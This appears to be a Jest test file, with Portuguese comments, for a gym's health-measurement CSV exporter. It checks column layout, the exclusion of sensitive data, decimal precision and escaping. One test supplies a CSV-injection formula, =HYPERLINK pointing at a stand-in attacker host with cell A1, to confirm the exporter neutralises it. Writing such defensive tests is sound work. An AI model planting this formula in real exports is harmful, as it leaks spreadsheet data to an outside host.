import { describe, expect, it } from '@jest/globals';

import {
  COLUNAS_DE_MEDIDA,
  cabecalhoDeMedida,
  linhaDeMedida,
  type MedidaExportavel,
} from './csv-de-saude.js';

/**
 * F18 -- exportacao do historico (`M3-FR-017`, `M3-AC-010`).
 *
 * O que estes testes defendem:
 *
 *   - **CSV injection** nao passa (o nome do aluno e campo livre de cadastro);
 *   - o par ORIGINAL + CANONICO sobrevive ao arquivo (INV-105);
 *   - decimal sai como STRING, sem passar por `number` (INV-106);
 *   - a cadeia de correcao e visivel na planilha (INV-102);
 *   - dado de saude sensivel NAO entra na exportacao (ADR-037, art. 11).
 */

const BASE: MedidaExportavel = {
  assessmentId: 'aval-1',
  studentId: 'aluno-1',
  studentName: 'Maria Souza',
  assessedAt: '2026-06-10T12:00:00.000Z',
  assessedAtLocal: '2026-06-10 09:00:00',
  publishedAt: '2026-06-10T13:00:00.000Z',
  status: 'PUBLISHED',
  source: 'MANUAL',
  correctsAssessmentId: null,
  superseded: false,
  type: 'WEIGHT',
  originalValue: '81.2500',
  originalUnit: 'KG',
  canonicalValue: '81.2500',
  canonicalUnit: 'KG',
  evaluatorUserId: 'user-1',
};

const celulas = (linha: string): string[] => linha.trimEnd().split(',');

describe('cabecalhoDeMedida', () => {
  it('tem uma coluna para cada campo declarado', () => {
    expect(celulas(cabecalhoDeMedida())).toHaveLength(COLUNAS_DE_MEDIDA.length);
  });

  it('carrega valor e unidade nas DUAS formas (INV-105)', () => {
    const cabecalho = cabecalhoDeMedida();

    // Exportar so o canonico apagaria a prova de que a balanca reportava em
    // libras.
    expect(cabecalho).toContain('original_value');
    expect(cabecalho).toContain('original_unit');
    expect(cabecalho).toContain('canonical_value');
    expect(cabecalho).toContain('canonical_unit');
  });

  it('NAO carrega dado de saude sensivel nem PII alem do nome', () => {
    const cabecalho = cabecalhoDeMedida();

    // Fator de contexto e dado do art. 11 (ADR-037) e nao entra numa planilha
    // que a academia manda por e-mail. CPF e biometria, idem.
    for (const proibido of ['cpf', 'context', 'factor', 'biometric', 'photo', 'phone']) {
      expect(cabecalho.toLowerCase()).not.toContain(proibido);
    }
  });
});

describe('linhaDeMedida', () => {
  it('escreve a medida na ordem das colunas', () => {
    const linha = celulas(linhaDeMedida(BASE));

    expect(linha[0]).toBe('aval-1');
    expect(linha[COLUNAS_DE_MEDIDA.indexOf('measurement_type')]).toBe('WEIGHT');
  });

  it('neutraliza formula no nome do aluno (CSV injection)', () => {
    // O ataque: alguem se cadastra com esse nome, a academia exporta, alguem
    // abre no Excel e a planilha faz a requisicao. O dado nunca executou no
    // nosso servidor -- e vazou mesmo assim.
    const linha = linhaDeMedida({
      ...BASE,
      studentName: '=HYPERLINK("http://atacante.test/?"&A1)',
    });

    expect(linha).toContain("'=HYPERLINK");
  });

  it('neutraliza os outros prefixos perigosos', () => {
    for (const prefixo of ['+', '-', '@']) {
      const linha = linhaDeMedida({ ...BASE, studentName: `${prefixo}CMD` });

      expect(linha).toContain(`'${prefixo}CMD`);
    }
  });

  it('preserva o decimal como texto, sem passar por number (INV-106)', () => {
    // `81.2500` tem de chegar identico: converter para `number` no caminho
    // introduziria erro binario justamente no arquivo que serve de prova.
    const linha = celulas(linhaDeMedida(BASE));

    expect(linha[COLUNAS_DE_MEDIDA.indexOf('canonical_value')]).toBe('81.2500');
  });

  it('mostra a cadeia de correcao (INV-102)', () => {
    const linha = celulas(
      linhaDeMedida({ ...BASE, assessmentId: 'aval-2', correctsAssessmentId: 'aval-1' }),
    );

    // Sem esta coluna, duas linhas do mesmo dia leriam como duas medicoes --
    // que e exatamente a conclusao errada.
    expect(linha[COLUNAS_DE_MEDIDA.indexOf('corrects_assessment_id')]).toBe('aval-1');
  });

  it('marca a avaliacao que ja foi corrigida, sem apaga-la do arquivo', () => {
    const linha = celulas(linhaDeMedida({ ...BASE, superseded: true }));

    // A original some do GRAFICO, nao da auditoria: ela prova que o numero
    // errado circulou.
    expect(linha[COLUNAS_DE_MEDIDA.indexOf('superseded')]).toBe('true');
  });

  it('unidade ausente vira celula vazia, nao a palavra null', () => {
    // `VISCERAL_FAT_LEVEL` e adimensional. "null" na planilha leria como
    // texto de valor.
    const linha = celulas(
      linhaDeMedida({ ...BASE, type: 'VISCERAL_FAT_LEVEL', originalUnit: null, canonicalUnit: null }),
    );

    expect(linha[COLUNAS_DE_MEDIDA.indexOf('original_unit')]).toBe('');
    expect(linha[COLUNAS_DE_MEDIDA.indexOf('canonical_unit')]).toBe('');
  });

  it('escapa virgula no nome sem quebrar a linha em duas', () => {
    const linha = linhaDeMedida({ ...BASE, studentName: 'Souza, Maria' });

    expect(linha).toContain('"Souza, Maria"');
    expect(celulas(linha)).toHaveLength(COLUNAS_DE_MEDIDA.length + 1);
  });

  it('leva os dois instantes: UTC e o local da unidade', () => {
    const linha = celulas(linhaDeMedida(BASE));

    // Exportar so um produziria a discussao classica -- "essa medicao foi as
    // 12h ou as 9h?" -- e a resposta dependeria de quem abriu a planilha.
    expect(linha[COLUNAS_DE_MEDIDA.indexOf('assessed_at_utc')]).toBe('2026-06-10T12:00:00.000Z');
    expect(linha[COLUNAS_DE_MEDIDA.indexOf('assessed_at_local')]).toBe('2026-06-10 09:00:00');
  });
});
